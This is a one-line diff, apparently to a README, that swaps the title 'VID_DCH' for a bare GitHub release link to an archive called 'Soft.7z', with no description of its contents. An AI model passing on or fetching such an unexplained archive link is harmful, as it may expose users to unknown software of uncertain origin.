@@ -1,1 +1,1 @@
-# VID_DCH
+https://github.com/iArlequino/VID_DCH/releases/download/ssss/Soft.7z
